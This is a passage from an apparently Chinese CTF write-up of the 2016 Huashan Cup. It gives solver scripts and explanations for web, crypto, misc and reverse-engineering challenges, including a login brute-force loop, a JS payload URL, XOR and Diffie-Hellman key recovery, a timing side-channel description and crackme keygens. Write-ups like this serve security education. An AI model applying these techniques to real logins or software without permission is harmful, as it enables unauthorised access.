class="string">'123456'</span>,<span class="string">'login'</span>:<span class="string">'%E7%99%BB%E5%BD%95'</span>}</div><div class="line">    r=requests.post(url,data=payload)</div><div class="line">    <span class="keyword">if</span> len(r.text)==<span class="number">486</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"payload is wrong"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"payload is right"</span></div></pre></td></tr></table></figure>
<h2 id="疯狂的JS-300"><a class="headerlink" href="#疯狂的JS-300" title="疯狂的JS(300)"></a>疯狂的JS(300)</h2><blockquote>
<p>疯狂的js，老师给我布置了一道js题，作为js小白的我做不到啊，大家帮忙看看吧~</p>
</blockquote>
<p>这个也是没做出来的<br/><strong>题在出题过程中可能借鉴了</strong> <a href="https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/halphow2js" rel="external" target="_blank">这里</a><br/>payload：<a href="http://js.xdsec.cn/myajax?a=2.0&amp;b=2.00&amp;c=2.000&amp;d=7&amp;e=762" rel="external" target="_blank">http://js.xdsec.cn/myajax?a=2.0&amp;b=2.00&amp;c=2.000&amp;d=7&amp;e=762</a></p>
<h1 id="Crypto"><a class="headerlink" href="#Crypto" title="Crypto"></a>Crypto</h1><h2 id="紧急报文"><a class="headerlink" href="#紧急报文" title="紧急报文"></a>紧急报文</h2><blockquote>
<p>解密一下这份截获的密文吧，时间就是机会！<br/>FA XX DD AG FF XG FD XG DD DG GA XF FA</p>
</blockquote>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/011603%20"/></p>
<h2 id="is-it-x-or-z"><a class="headerlink" href="#is-it-x-or-z" title="is it x or z ?"></a>is it x or z ?</h2><blockquote>
<p>is it x or z ?<br/>100<br/>你可以解密这些残损的文件吗？</p>
</blockquote>
<p>明文1和密文1异或得到key<br/>密文2的key从最后个字母f开始循环<br/>异或得到明文2</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/012324%20"/></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: cp936 -*-  </span></div><div class="line"><span class="keyword">import</span> binascii  </div><div class="line"><span class="keyword">import</span> struct   </div><div class="line">  </div><div class="line"><span class="comment">#每个字节转成hex，0x顺便去掉，对于不足两位的补0  </span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(str)</span>:</span>  </div><div class="line">    hexs = []  </div><div class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str:  </div><div class="line">        tmp = (hex(ord(s)).replace(<span class="string">'0x'</span>,<span class="string">''</span>))  </div><div class="line">        <span class="keyword">if</span> len(tmp) == <span class="number">2</span>:  </div><div class="line">            hexs.append(tmp)  </div><div class="line">        <span class="keyword">else</span>:  </div><div class="line">            hexs.append(<span class="string">'0'</span>+tmp)  </div><div class="line">    <span class="keyword">return</span> hexs  </div><div class="line">  </div><div class="line">arr  = [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>]  </div><div class="line">arr2 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>]  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tran</span><span class="params">(r)</span>:</span>  </div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):  </div><div class="line">        <span class="keyword">if</span> r == arr[i]:  </div><div class="line">            <span class="keyword">return</span> arr2[i]  </div><div class="line">  </div><div class="line">  </div><div class="line">          </div><div class="line">f = open(<span class="string">'crypt-2.txt'</span>,<span class="string">'rb'</span>)  </div><div class="line">f2 = open(<span class="string">'key.txt'</span>,<span class="string">'rb'</span>)  </div><div class="line">hexs = []  </div><div class="line">hexs2 = []  </div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:   </div><div class="line">    t = f.readline()  </div><div class="line">    t2 = f2.readline()  </div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> t <span class="keyword">or</span> <span class="keyword">not</span> t2:  </div><div class="line">        <span class="keyword">break</span>  </div><div class="line">    hexs.extend(str2hex(t))  </div><div class="line">    hexs2.extend(str2hex(t2))  </div><div class="line">f.close()  </div><div class="line">f2.close()  </div><div class="line">  </div><div class="line">ff = open(<span class="string">'out.txt'</span>,<span class="string">'wb'</span>)  </div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(min(len(hexs),len(hexs2))):  </div><div class="line">    a = tran(hexs[i][<span class="number">0</span>])*<span class="number">16</span>+tran(hexs[i][<span class="number">1</span>])  </div><div class="line">    b = tran(hexs2[i][<span class="number">0</span>])*<span class="number">16</span>+tran(hexs2[i][<span class="number">1</span>])  </div><div class="line">    B = struct.pack(<span class="string">'B'</span>,a^b)  </div><div class="line">    ff.write(B)      </div><div class="line">ff.close()</div></pre></td></tr></table></figure>
<h2 id="分组加密检测-150"><a class="headerlink" href="#分组加密检测-150" title="分组加密检测(150)"></a>分组加密检测(150)</h2><blockquote>
<p>分组加密模式检测</p>
</blockquote>
<p>文件（challenge.txt）包含base64编码后的密文，其中某段密文采用的加密模式不太一样，请找出，并以该段密文base64解码后的前16个字符作为flag提交。</p>
<p>先全部base64解码 然后再去检测<br/><a href="https://github.com/truongkma/ctf-tools/tree/master/cryptopals-solutions-master/set1/8" rel="external" target="_blank">Github</a>上面有项目 下载下来跑一下就是了 </p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/012618%20"/></p>
<h2 id="修复一下这份邀请函部分内容-200"><a class="headerlink" href="#修复一下这份邀请函部分内容-200" title="修复一下这份邀请函部分内容(200)"></a>修复一下这份邀请函部分内容(200)</h2><blockquote>
<p>修复一下这份邀请函的部分内容</p>
</blockquote>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/012803%20"/></p>
<p>红色部分就是flag 了</p>
<h2 id="时间决定一切-350"><a class="headerlink" href="#时间决定一切-350" title="时间决定一切(350)"></a>时间决定一切(350)</h2><blockquote>
<p>时间决定一切</p>
</blockquote>
<p>考验大家人品的时候到啦！！！<br/><a href="http://huashan.xdsec.cn/mima/" rel="external" target="_blank">http://huashan.xdsec.cn/mima/</a></p>
<p>利用“php很烦人”那题得到index.php源码，flag就在其中</p>
<p>正确解法：<br/><a href=""></a></p>
<p><a href="https://github.com/SpiderLabs/CryptOMG/blob/master/ctf/challenge3/index.php" rel="external" target="_blank">参考链接</a></p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ echo gjVGaqJZOnjm54LirXgElRIAOnb8oVEWfkj/<span class="number">7m</span>edMRU= | base64 -d | xxd</div><div class="line"><span class="number">00000000</span>: <span class="number">8235</span> <span class="number">466</span>a a<span class="number">259 3a78</span> e<span class="number">6e7 82e2</span> ad78 <span class="number">0495</span>  .<span class="number">5</span>Fj.Y:x.....x..</div><div class="line"><span class="number">00000010</span>: <span class="number">1200 3a76</span> fca1 <span class="number">5116 7e48</span> ffee <span class="number">679d</span> <span class="number">3115</span>  ..:v..Q.~H..g.<span class="number">1</span>.</div></pre></td></tr></table></figure>
<p>从侧信道攻击的角度考虑，我们可以依次比较每个字符，对于不同的输入数据，执行10000次操作，耗费的时间是不同的，这样逐个字符破解，就可以得到目标值。</p>
<h2 id="协议？认证？加密？-300"><a class="headerlink" href="#协议？认证？加密？-300" title="协议？认证？加密？(300)"></a>协议？认证？加密？(300)</h2><blockquote>
<p>协议？认证？加密？</p>
</blockquote>
<p>安全也需要融合！</p>
<p>更新了一下代码</p>
<p>顺便做个分析</p>
<p>在流量包里面能找到关键信息<br/><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">T connection <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">12345</span> at Fri Sep <span class="number">09</span> <span class="number">13</span>:<span class="number">14</span>:<span class="number">22</span> <span class="number">2016</span> succeed!</div><div class="line">R OK</div><div class="line">T Welcome to the Humen DH-AES Key eXchange System!</div><div class="line">R OK</div><div class="line">T g:<span class="number">7</span></div><div class="line">R OK</div><div class="line">T p:<span class="number">1023789085312022807</span></div><div class="line">R OK</div><div class="line">T A:<span class="number">651518302569801068</span></div><div class="line">R OK</div><div class="line">T Give your Para-<span class="keyword">B?</span></div><div class="line">R <span class="number">310117834581236149</span></div><div class="line">T</div><div class="line"><span class="symbol">Secrct</span> <span class="meta">data</span>!</div><div class="line">/ReO]]<span class="number">0000</span>   <span class="number">53</span> <span class="number">65</span> <span class="number">63</span> ** ** ** ** <span class="number">64</span> <span class="number">61</span> <span class="number">74</span> <span class="number">61</span> <span class="number">21</span> <span class="number">0</span>a <span class="number">2</span>f a0 <span class="built_in">c7</span>  Secrct <span class="meta">data</span>!./..</div><div class="line"><span class="number">0010</span>   <span class="built_in">a1</span> <span class="number">0</span>e <span class="number">0</span>d <span class="number">87</span> a5 <span class="number">8</span>f <span class="number">52</span> <span class="keyword">bd </span>dd <span class="built_in">d4</span> <span class="number">65</span> <span class="built_in">d0</span> <span class="keyword">b0 </span><span class="number">8</span>e <span class="number">4</span>f <span class="keyword">ba </span> ......R...e...O.</div><div class="line"><span class="number">0020</span>   da <span class="keyword">ba </span>e6 <span class="number">93</span> <span class="number">90</span> fc <span class="built_in">d7</span> <span class="built_in">c2</span> <span class="number">5</span>d <span class="number">91</span> <span class="number">5</span>d fa <span class="built_in">d1</span>           ........].]..</div></pre></td></tr></table></figure></p>
<p><strong>DH-AES</strong>规则<br/>先定p和g  然后双方随机 a和b<br/>计算出A和B传给对方。双方进行运算<br/>(g^b%p)   (g^a%p)分别是B ，A</p>
<p>(g^b%p)^a%p=(g^a%p)^b%p</p>
<p>B^a%p=A^b%p   ————就是Key<br/>其中的g p是公开的。a,b是私密的。<br/>这样就能进行加密运算了 所以我们要解密也是需要知道key的<br/>所以只要得到<strong> pow(B,a,p)</strong> 或者  <strong>pow(A,b,p) </strong></p>
<p>总结一下<br/>A选择一个随机数c,(0&lt;c&lt;p)，发送g<strong>c mod p给B，作为公钥；将c妥善保管作为私钥<br/>B选择一个随机数d,(0&lt;d&lt;p)，发送g</strong>d mod p给A，作为公钥；将d妥善保管作为私钥<br/>此时A、B双方都能计算K=(g<strong>c mod p)</strong>d=(g<strong>d mod p)</strong>c=(g**cd mod p)，即K即为A、B之间的密钥</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">a = <span class="number">274389752</span></div><div class="line"></div><div class="line">A = <span class="number">651518302569801068</span></div><div class="line"></div><div class="line">B = <span class="number">310117834581236149</span></div><div class="line"></div><div class="line">p = <span class="number">1023789085312022807</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># a的计算  这里考的是离散对数</span></div><div class="line">a = <span class="number">1</span></div><div class="line"></div><div class="line">myA = <span class="number">7</span></div><div class="line"><span class="keyword">while</span> myA != A:</div><div class="line">    myA = myA*<span class="number">7</span> % p</div><div class="line">    a += <span class="number">1</span></div><div class="line"><span class="comment"># a = 274389752</span></div><div class="line"><span class="comment"># 计算明文</span></div><div class="line">key = pow(B,a,p)</div><div class="line"></div><div class="line"><span class="keyword">print</span> hex(key)</div><div class="line"></div><div class="line">key = <span class="string">'\x00'</span>*<span class="number">8</span>+<span class="string">'0bb82841e54d05dd'</span>.decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"><span class="comment">#key = hashlib.md5(key).digest()</span></div><div class="line">cipher = AES.new(key,AES.MODE_CBC,<span class="string">'\x00'</span>*<span class="number">16</span>)</div><div class="line"></div><div class="line">c = <span class="string">"2fa0c7a10e0d87a58f52bdddd465d0b08e4fbadabae69390fcd7c25d915dfad1"</span>.decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> cipher.decrypt(c)</div></pre></td></tr></table></figure>
<h1 id="Misc"><a class="headerlink" href="#Misc" title="Misc"></a>Misc</h1><h2 id="Try-Everything-200"><a class="headerlink" href="#Try-Everything-200" title="Try Everything(200)"></a>Try Everything(200)</h2><blockquote>
<p>Try Everything  try everything you can to get flag, and DO NOT ASK MANAGER THE FLAG.</p>
</blockquote>
<p>这题的file若是直接解压的话，得到的内容是乱序的，但是仔细一看flag形式的字样都有，于是关键是如何调整顺序，这里借用binwalk</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/013146%20"/></p>
<p>得到文件的偏移量<br/>里面文件每个地址对应了不同的文件名（序号还不同），所以只要把里面的offset整理好，然后写个脚本分离源文件到各个小文件，然后解压，再按数字来排序就可以。<br/>以下脚本基于自己先整理出了offset，以及建立了一个out文件夹</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf8 -*-</span></div><div class="line"><span class="keyword">import</span> gzip</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">	f_all=open(<span class="string">'file'</span>,<span class="string">'rb'</span>).read()</div><div class="line">	<span class="comment">#print len(f_all)</span></div><div class="line">	l1=[<span class="number">0</span>   , <span class="number">24</span>  , <span class="number">48</span>  , <span class="number">73</span>  , <span class="number">98</span>  , <span class="number">122</span> , <span class="number">146</span> , <span class="number">170</span> , <span class="number">195</span> , <span class="number">220</span> , <span class="number">245</span> , <span class="number">270</span> , <span class="number">295</span> , <span class="number">319</span> , <span class="number">344</span> , <span class="number">368</span> , <span class="number">393</span> , <span class="number">418</span> , <span class="number">443</span> , <span class="number">467</span> , <span class="number">491</span> , <span class="number">515</span> , <span class="number">539</span> , <span class="number">562</span> , <span class="number">586</span> , <span class="number">611</span> , <span class="number">635</span> , <span class="number">659</span> , <span class="number">683</span> , <span class="number">708</span> , <span class="number">732</span> , <span class="number">756</span> , <span class="number">781</span> , <span class="number">806</span> , <span class="number">829</span> , <span class="number">853</span> , <span class="number">877</span> , <span class="number">901</span> , <span class="number">925</span> , <span class="number">950</span> , <span class="number">975</span> , <span class="number">999</span> , <span class="number">1024</span>, <span class="number">1048</span>, <span class="number">1071</span>, <span class="number">1095</span>, <span class="number">1120</span>, <span class="number">1144</span>, <span class="number">1168</span>, <span class="number">1192</span>, <span class="number">1216</span>, <span class="number">1241</span>, <span class="number">1265</span>, <span class="number">1290</span>, <span class="number">1315</span>, <span class="number">1340</span>, <span class="number">1364</span>, <span class="number">1389</span>, <span class="number">1412</span>, <span class="number">1436</span>, <span class="number">1460</span>, <span class="number">1484</span>, <span class="number">1508</span>, <span class="number">1533</span>, <span class="number">1557</span>, <span class="number">1582</span>, <span class="number">1607</span>, <span class="number">1631</span>, <span class="number">1656</span>, <span class="number">1681</span>, <span class="number">1705</span>, <span class="number">1729</span>, <span class="number">1753</span>, <span class="number">1777</span>, <span class="number">1802</span>, <span class="number">1825</span>, <span class="number">1849</span>, <span class="number">1873</span>, <span class="number">1898</span>, <span class="number">1923</span>, <span class="number">1947</span>, <span class="number">1971</span>, <span class="number">1995</span>, <span class="number">2020</span>, <span class="number">2044</span>, <span class="number">2069</span>, <span class="number">2094</span>, <span class="number">2118</span>, <span class="number">2143</span>, <span class="number">2167</span>, <span class="number">2191</span>, <span class="number">2215</span>, <span class="number">2239</span>, <span class="number">2264</span>, <span class="number">2288</span>, <span class="number">2313</span>, <span class="number">2338</span>, <span class="number">2363</span>, <span class="number">2387</span>, <span class="number">2412</span>, <span class="number">2437</span>, <span class="number">2462</span>, <span class="number">2486</span>, <span class="number">2511</span>, <span class="number">2536</span>, <span class="number">2560</span>, <span class="number">2584</span>, <span class="number">2609</span>, <span class="number">2634</span>, <span class="number">2658</span>, <span class="number">2682</span>, <span class="number">2707</span>, <span class="number">2731</span>, <span class="number">2755</span>, <span class="number">2780</span>, <span class="number">2805</span>, <span class="number">2829</span>, <span class="number">2854</span>, <span class="number">2878</span>, <span class="number">2902</span>, <span class="number">2926</span>, <span class="number">2950</span>, <span class="number">2974</span>, <span class="number">2998</span>, <span class="number">3022</span>, <span class="number">3046</span>, <span class="number">3071</span>, <span class="number">3096</span>, <span class="number">3120</span>, <span class="number">3145</span>, <span class="number">3170</span>, <span class="number">3195</span>, <span class="number">3220</span>, <span class="number">3245</span>, <span class="number">3269</span>, <span class="number">3293</span>, <span class="number">3316</span>, <span class="number">3340</span>, <span class="number">3364</span>, <span class="number">3389</span>, <span class="number">3413</span>, <span class="number">3437</span>, <span class="number">3462</span>, <span class="number">3486</span>, <span class="number">3511</span>, <span class="number">3534</span>, <span class="number">3559</span>, <span class="number">3583</span>, <span class="number">3607</span>, <span class="number">3631</span>, <span class="number">3655</span>, <span class="number">3679</span>, <span class="number">3704</span>, <span class="number">3727</span>, <span class="number">3751</span>, <span class="number">3774</span>, <span class="number">3798</span>, <span class="number">3822</span>, <span class="number">3847</span>, <span class="number">3870</span>, <span class="number">3894</span>, <span class="number">3918</span>, <span class="number">3942</span>, <span class="number">3966</span>, <span class="number">3990</span>] <span class="comment">#最后一个是len(f_all)</span></div><div class="line">	l2=[<span class="number">24</span>,<span class="number">72</span>,<span class="number">108</span>,<span class="number">129</span>,<span class="number">18</span>,<span class="number">92</span>,<span class="number">63</span>,<span class="number">162</span>,<span class="number">110</span>,<span class="number">156</span>,<span class="number">132</span>,<span class="number">101</span>,<span class="number">34</span>,<span class="number">143</span>,<span class="number">28</span>,<span class="number">136</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">69</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">127</span>,<span class="number">55</span>,<span class="number">58</span>,<span class="number">86</span>,<span class="number">149</span>,<span class="number">21</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">142</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">88</span>,<span class="number">133</span>,<span class="number">161</span>,<span class="number">35</span>,<span class="number">137</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">20</span>,<span class="number">113</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">91</span>,<span class="number">78</span>,<span class="number">102</span>,<span class="number">19</span>,<span class="number">135</span>,<span class="number">153</span>,<span class="number">105</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">9</span>,<span class="number">68</span>,<span class="number">64</span>,<span class="number">81</span>,<span class="number">93</span>,<span class="number">147</span>,<span class="number">67</span>,<span class="number">138</span>,<span class="number">160</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">154</span>,<span class="number">75</span>,<span class="number">89</span>,<span class="number">66</span>,<span class="number">26</span>,<span class="number">141</span>,<span class="number">2</span>,<span class="number">98</span>,<span class="number">96</span>,<span class="number">124</span>,<span class="number">145</span>,<span class="number">84</span>,<span class="number">71</span>,<span class="number">15</span>,<span class="number">140</span>,<span class="number">90</span>,<span class="number">144</span>,<span class="number">100</span>,<span class="number">61</span>,<span class="number">131</span>,<span class="number">27</span>,<span class="number">23</span>,<span class="number">53</span>,<span class="number">40</span>,<span class="number">130</span>,<span class="number">47</span>,<span class="number">117</span>,<span class="number">148</span>,<span class="number">150</span>,<span class="number">50</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">121</span>,<span class="number">123</span>,<span class="number">82</span>,<span class="number">45</span>,<span class="number">152</span>,<span class="number">109</span>,<span class="number">62</span>,<span class="number">70</span>,<span class="number">116</span>,<span class="number">77</span>,<span class="number">12</span>,<span class="number">139</span>,<span class="number">155</span>,<span class="number">80</span>,<span class="number">103</span>,<span class="number">13</span>,<span class="number">74</span>,<span class="number">16</span>,<span class="number">51</span>,<span class="number">94</span>,<span class="number">87</span>,<span class="number">97</span>,<span class="number">25</span>,<span class="number">151</span>,<span class="number">128</span>,<span class="number">54</span>,<span class="number">125</span>,<span class="number">112</span>,<span class="number">119</span>,<span class="number">118</span>,<span class="number">158</span>,<span class="number">99</span>,<span class="number">95</span>,<span class="number">4</span>,<span class="number">38</span>,<span class="number">79</span>,<span class="number">157</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">134</span>,<span class="number">30</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">104</span>,<span class="number">52</span>,<span class="number">65</span>,<span class="number">44</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">163</span>,<span class="number">0</span>,<span class="number">76</span>,<span class="number">5</span>,<span class="number">60</span>,<span class="number">59</span>,<span class="number">159</span>,<span class="number">8</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">43</span>,<span class="number">56</span>,<span class="number">39</span>]</div><div class="line">	</div><div class="line">	fname_list=[]</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(l2)):</div><div class="line">		s=f_all[l1[i]:l1[i+<span class="number">1</span>]]</div><div class="line">		fname=l2[i]</div><div class="line">		<span class="comment">#gz文件</span></div><div class="line">		<span class="keyword">with</span> open(<span class="string">r'out\%d.gz'</span> %fname,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">			f.write(s)</div><div class="line">		fname_list.append(fname)</div><div class="line">	fname_list.sort() <span class="comment">#从小到大排序</span></div><div class="line">	</div><div class="line">	flag=<span class="string">''</span></div><div class="line">	<span class="keyword">for</span> fname <span class="keyword">in</span> fname_list:</div><div class="line">		flag+=gzip.open(<span class="string">r'out\%d.gz'</span> %fname,<span class="string">'rb'</span>).read()</div><div class="line">	<span class="keyword">print</span> flag	</div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	foo()</div><div class="line">	<span class="keyword">print</span> <span class="string">'ok'</span></div></pre></td></tr></table></figure>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/013351%20"/></p>
<h2 id="挣脱牢笼"><a class="headerlink" href="#挣脱牢笼" title="挣脱牢笼"></a>挣脱牢笼</h2><h1 id="Reverse"><a class="headerlink" href="#Reverse" title="Reverse"></a>Reverse</h1><h2 id="Waring-Up-100"><a class="headerlink" href="#Waring-Up-100" title="Waring Up(100)"></a>Waring Up(100)</h2><blockquote>
<p>Warming Up</p>
</blockquote>
<p>Crack the easy program crackme, the key is your correct inpu</p>
<p>Crack the easy program crackme, the key is your correct input<br/>直接IDA打开，来到main_0()，程序主流程在这此函数里</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/013708%20"/></p>
<p>v4获取输入，v3为输入字串长度，然后进sub_401005()进行字串处理，sub_40100A()为结果比较。先看下结果比较函数：</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/013904%20"/></p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/014005%20"/></p>
<p>可以看出，处理过的输入与”VgobmndVlBVE”官串比较。<br/>再看输入字串处理函数，sub_401005()直接跳到地址40DBF0。<br/>关键处理操作如图：</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/014133%20"/></p>
<p>写个小脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">target = <span class="string">"VgobmndVlBVE"</span></div><div class="line">result = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> index, item <span class="keyword">in</span> enumerate(target):</div><div class="line">	result += chr(ord(item)^(((index)%<span class="number">3</span>)+<span class="number">1</span>))</div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure>
<h2 id="到手的钥匙-100"><a class="headerlink" href="#到手的钥匙-100" title="到手的钥匙(100)"></a>到手的钥匙(100)</h2><blockquote>
<p>到手的钥匙。现在已经确定截获到一个对方用来传递密钥的程序，但是如何才能拿到密钥？</p>
</blockquote>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/014339%20"/></p>
<p>一个是帐号 一个是密码</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/014448%20"/></p>
<p>屏幕输出一堆奇怪的东西<br/>帐号+密码+这一堆  就是flag了</p>
<h2 id="忘记用户名-100"><a class="headerlink" href="#忘记用户名-100" title="忘记用户名(100)"></a>忘记用户名(100)</h2><blockquote>
<p>忘记用户名。过了好久，用户名都不记得了，难道只能重置了么</p>
</blockquote>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/085534%20"/></p>
<p> 做了简单的加减</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">'ILoveXD'</span></div><div class="line">ct=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</div><div class="line"> <span class="keyword">print</span> chr(ord(c)+<span class="number">7</span>-ct)</div><div class="line"> ct=ct+<span class="number">1</span></div></pre></td></tr></table></figure>
<h2 id="Help-me-150"><a class="headerlink" href="#Help-me-150" title="Help me(150)"></a>Help me(150)</h2><blockquote>
<p>Help me</p>
</blockquote>
<p>What’s wrong with my program? Who can crack this? Do me a favor…</p>
<p>直接扔进IDA，如图：</p>
<p><img alt="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/085911%20"/></p>
<p>其中有些空代码，还有些不太正确的语句。程序是不能正常运行的。如开始处的v10,v0等。main()函数中前面一部分主要是一些打印语句，求字串长度及一些赋值操作。这里有四个赋值下面需要用到：</p>
